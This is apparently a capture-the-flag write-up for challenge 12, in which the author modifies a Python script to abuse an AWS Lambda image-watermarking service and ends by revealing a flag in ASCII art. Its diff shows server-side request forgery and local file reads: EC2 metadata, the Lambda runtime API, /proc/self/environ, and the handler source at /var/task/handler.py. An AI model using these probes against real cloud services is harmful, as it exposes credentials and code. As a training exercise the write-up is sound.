# 12 - Making you do my bidding

In the [previous challenge](), we learned the path on the file system to the Lambda function handler (`/var/task/handler.py`). So, let's modify our Python script to download it!

```diff
diff --git a/11 - Invoking the devil/watermark.py b/12 - Making you do my bidding/watermark.py
index 483664c..900c0f2 100644
--- a/11 - Invoking the devil/watermark.py
+++ b/12 - Making you do my bidding/watermark.py
@@ -21,15 +21,8 @@ sts_client = boto3.client("sts")
 def main():
     aws_auth = get_aws_auth()

-    # EC2 Metadata endpoint
-    print(watermark_image("http://169.254.169.254/latest/meta-data/", aws_auth))
-
-    # Lambda runtime API
-    # https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html
-    print(watermark_image("http://localhost:9001/2018-06-01/runtime/invocation/next", aws_auth))
-
-    # The current shell environment of the Lambda function
-    print(watermark_image("file:///proc/self/environ", aws_auth))
+    # The source code to the Lambda function?^M
+    print(watermark_image("file:///var/task/handler.py", aws_auth))^M

 def get_aws_auth() -> AWSRequestsAuth:
     api_gateway_netloc = urlparse(API_GATEWAY_URL).netloc
```

```console
$ python watermark.py
{'uploaded_image': 'waiting-for-approval/9e922faf-e0db-414c-942d-f48560fd896a.png'}
```

```console
$ aws s3 cp s3://carousel-app-appbucketswatermarkedimagesbucketfce-1tojqzrov3x1u/waiting-for-approval/9e922faf-e0db-414c-942d-f48560fd896a.png .
```

<details>

```python
#                          ...----....
#                      ..-:"''         ''"-..
#                   .-'                      '-.
#                 .'              .     .       '.
#               .'   .          .    .      .    .''.
#             .'  .    .       .   .   .     .   . ..:.
#           .' .   . .  .       .   .   ..  .   . ....::.
#          ..   .   .      .  .    .     .  ..  . ....:IA.
#         .:  .   .    .    .  .  .    .. .  .. .. ....:IA.
#        .: .   .   ..   .    .     . . .. . ... ....:.:VHA.
#        '..  .  .. .   .       .  . .. . .. . .....:.::IHHB.
#       .:. .  . .  . .   .  .  . . . ...:.:... .......:HIHMM.
#      .:.... .   . ."::"'.. .   .  . .:.:.:II;,. .. ..:IHIMMA
#      ':.:..  ..::IHHHHHI::. . .  ...:.::::.,,,. . ....VIMMHM
#     .:::I. .AHHHHHHHHHHAI::. .:...,:IIHHHHHHMMMHHL:. . VMMMM
#    .:.:V.:IVHHHHHHHMHMHHH::..:" .:HIHHHHHHHHHHHHHMHHA. .VMMM.
#    :..V.:IVHHHHHMMHHHHHHHB... . .:VPHHMHHHMMHHHHHHHHHAI.:VMMI
#    ::V..:VIHHHHHHMMMHHHHHH. .   .I":IIMHHMMHHHHHHHHHHHAPI:WMM
#    ::". .:.HHHHHHHHMMHHHHHI.  . .:..I:MHMMHHHHHHHHHMHV:':H:WM
#    :: . :.::IIHHHHHHMMHHHHV  .ABA.:.:IMHMHMMMHMHHHHV:'. .IHWW
#    '.  ..:..:.:IHHHHHMMHV" .AVMHMA.:.'VHMMMMHHHHHV:' .  :IHWV
#     :.  .:...:".:.:TPP"   .AVMMHMMA.:. "VMMHHHP.:... .. :IVAI
#    .:.   '... .:"'   .   ..HMMMHMMMA::. ."VHHI:::....  .:IHW'
#    ...  .  . ..:IIPPIH: ..HMMMI.MMMV:I:.  .:ILLH:.. ...:I:IM
#  : .   .'"' .:.V". .. .  :HMMM:IMMMI::I. ..:HHIIPPHI::'.P:HM.
#  :.  .  .  .. ..:.. .    :AMMM IMMMM..:...:IV":T::I::.".:IHIMA
#  'V:.. .. . .. .  .  .   'VMMV..VMMV :....:V:.:..:....::IHHHMH
#    "IHH:.II:.. .:. .  . . . " :HB"" . . ..PI:.::.:::..:IHHMMV"
#     :IP""HHII:.  .  .    . . .'V:. . . ..:IH:.:.::IHIHHMMMMM"
#     :V:. VIMA:I..  .     .  . .. . .  .:.I:I:..:IHHHHMMHHMMM
#     :"VI:.VWMA::. .:      .   .. .:. ..:.I::.:IVHHHMMMHMMMMI
#     :."VIIHHMMA:.  .   .   .:  .:.. . .:.II:I:AMMMMMMHMMMMMI
#     :..VIHIHMMMI...::.,:.,:!"I:!"I!"I!"V:AI:VAMMMMMMHMMMMMM'
#     ':.:HIHIMHHA:"!!"I.:AXXXVVXXXXXXXA:."HPHIMMMMHHMHMMMMMV
#       V:H:I:MA:W'I :AXXXIXII:IIIISSSSSSXXA.I.VMMMHMHMMMMMM
#         'I::IVA ASSSSXSSSSBBSBMBSSSSSSBBMMMBS.VVMMHIMM'"'
#          I:: VPAIMSSSSSSSSSBSSSMMBSSSBBMMMMXXI:MMHIMMI
#         .I::. "H:XIIXBBMMMMMMMMMMMMMMMMMBXIXXMMPHIIMM'
#         :::I.  ':XSSXXIIIIXSSBMBSSXXXIIIXXSMMAMI:.IMM
#         :::I:.  .VSSSSSISISISSSBII:ISSSSBMMB:MI:..:MM
#         ::.I:.  ':"SSSSSSSISISSXIIXSSSSBMMB:AHI:..MMM.
#         ::.I:. . ..:"BBSSSSSSSSSSSSBBBMMMB:AHHI::.HMMI
#         :..::.  . ..::":BBBBBSSBBBMMMB:MMMMHHII::IHHMI
#         ':.I:... ....:IHHHHHMMMMMMMMMMMMMMMHHIIIIHMMV"
#           "V:. ..:...:.IHHHMMMMMMMMMMMMMMMMHHHMHHMHP'
#            ':. .:::.:.::III::IHHHHMMMMMHMHMMHHHHM"
#              "::....::.:::..:..::IIIIIHHHHMMMHHMV"
#                "::.::.. .. .  ...:::IIHHMMMMHMV"
#                  "V::... . .I::IHHMMV"'
#                    '"VHVHHHAHHHHMMV:"'
#            ______________________________________
#   ________|                                      |_______
#   \       |                FLAG12                |      /
#    \      |  HF-Ytxpe6bwgnhOa1bIDjQzuImp9Qe86Hk9 |     /
#    /      |______________________________________|     \
#   /__________)                                (_________\
```

</details>

🚩

That was suprisingly simple.
